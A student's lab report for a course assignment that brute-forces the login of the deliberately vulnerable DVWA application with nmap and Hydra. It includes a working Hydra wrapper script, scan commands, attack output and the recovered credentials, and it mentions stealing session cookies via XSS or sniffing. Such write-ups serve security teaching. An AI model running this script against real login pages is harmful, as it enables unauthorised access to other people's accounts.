= Assignment: DVWA Brute-Force Login <assignment-6>

== Overview and Definitions

This section will document the DVWA brute-force login assignment using hydra. The assignment instructions seem to be fairly complete, so I won't be using any external resources for this assignment.

== Target Setup and Relevant Code

This time, the target is running DVWA and also a project called #link("https://github.com/spiderlabs/mcir")[The Magical Code Injection Rainbow!] (MCIR). First step was to login to the DVWA and use Firefox's developer tools to fetch the `PHPSESSID` cookie value. This time, it was:

```
fev6nqcplpprp08svhf9e278k3
```

Next step was to login to the target machine using SSH.

```
ssh jksouran@193.167.189.112 -p 2893
```

== Observations

The machine is running Debian 10 (buster), has a hostname `attack_tools` and my username is `jksouran`. I am in my primary group and also in sudo group. The IP of this machine is `173.0.72.2` with `/24` network. To find the local IP address of the DVWA machine, I used `nmap` to scan the network:

```
sudo nmap -F 173.0.72.0/24
```

The network scan revealed the following hosts:

- `.1` - `docker-test-environment`. This is the gateway. Ports 22 and 80 open.
- `.2` - `attack_tools`. This is the machine I am logged in. Port 22 is open.
- `.3` - `jksouran_dvwa_1.jksouran_dvwa_lan`. This is the DVWA machine. Ports 80 and 3306 are open.
- `.4` - `jksouran_mysqldb_1.jksouran_dvwa_lan`. This is a MySQL database machine. Port 3306 is open.
- `.5` - `jksouran_mcir_1.jksouran_dvwa_lan`. This is the MCIR machine. Port 80 is open.

The command is long and thus error prone, so I creted a `hailhydra.sh` shell script to run the hydra command:

```bash
#!/bin/bash

# Vars
USERNAMES='/usr/share/usernames'
PASSWORDS='/usr/share/common.txt'
PHPSESSID='fev6nqcplpprp08svhf9e278k3'
TARGET_IP='173.0.72.3'

# Build the payload
PAYLOAD="/vulnerabilities/brute/:"
PAYLOAD+="username=^USER^&password=^PASS^&Login=Login:"
PAYLOAD+="F=Username and/or password incorrect.:"
PAYLOAD+="H=Cookie: PHPSESSID=${PHPSESSID}; security=low"

# Run Hydra (later on, I added: -t 64)
hydra "${TARGET_IP}" -F -V -L "${USERNAMES}" \
   -P "${PASSWORDS}" \
   http-get-form "${PAYLOAD}"
```

The PHP session ID is a dependency. If we would not have a valid session ID, the server would not accept our login attempts. Thus, to get a valid session ID, this vulnerability is not exploitable without e.g. using the XSS vulnerability from Assignment 1 to steal a session ID using injected JavaScript code or by using a packet sniffer -- such as Wireshark -- to capture the session ID from the network traffic. The server is HTTP instead of HTTPS, so this would be fairly trivial to do.

Running the script reveals the login process, since the verbose flag is on. The output is super verbose, but starts like this:

```
ksouran@attack_tools:~$ bash hailhydra.sh 
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-09 08:03:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 96455 login tries (l:101/p:955), ~6029 tries per task
[DATA] attacking (snipped target)
[ATTEMPT] target 173.0.72.3 login "seppo" pass "123456" 1 of 96455 [child 0] (0/0)
[ATTEMPT] target 173.0.72.3 login "seppo" pass "12345678" 2 of 96455 [child 1] (0/0)
[ATTEMPT] target 173.0.72.3 login "seppo" pass "qwerty" 3 of 96455 [child 2] (0/0)
```
A couple of dash characters has been removed from the output to to make it fit a line in the report format. 

The process takes a while. Up to $N$ tries have to be attempted, where the $N$ is a Cartesian product of the username and password lists. I investigated the `hydr` commands flags. The option t (tasks) has a default of 16. I increased this to the maximum of 64 and restarted the process. The second run was running at about 4x speed. It was started at 11:23 and it finished at 11:34 after finding the first valid credential pair.

== Assignment Solution

The last lines in the output are:

```
ATTEMPT] target 173.0.72.3 login "stephen" pass "please" 30759 of 96455
[ATTEMPT] target 173.0.72.3 login "stephen" pass "brandy" 30760 of 96455
[80][http-get-form] host: 173.0.72.3   login: stephen   password: maverick
```

I used the `stephen:maverick` credentials to login to the DVWA and it worked. The password is not strong at all; not forcing the user to use a strong password is a security vulnerability that I rate as *CRITICAL*. Also, the server doesn't rate limit the login attemps in any way.
